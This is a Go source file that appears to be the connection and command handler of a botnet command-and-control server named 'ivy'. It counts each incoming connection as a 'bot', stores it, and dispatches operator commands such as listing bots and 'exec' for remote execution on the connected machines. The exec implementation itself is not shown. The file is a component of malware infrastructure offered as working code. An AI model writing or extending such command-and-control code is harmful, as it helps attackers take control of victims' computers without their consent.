package server

import (
	"net"
	config "ivy/util/config"
	commands "ivy/util/commands"
)


/*
    *    util/server/handler.go
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


func ConnectionHandler(connection net.Conn) {
	config.BotCount++
	config.Bots = append(config.Bots, connection)
}

func CommandHandler(command string) bool {
	commands := map[string]func() {
		"help": commands.HelpMenuCommands,
		"bots": commands.ListBotsCommands,
		"exec": commands.RemoteExecuteCommands,
		"clear": commands.ClearScreenCommands,
		"exit": commands.ExitCommands,
	}
	if m_value, m_accept := commands[command]; m_accept {
		_ = m_value
		commands[command]()
		return true
	}
	return false
}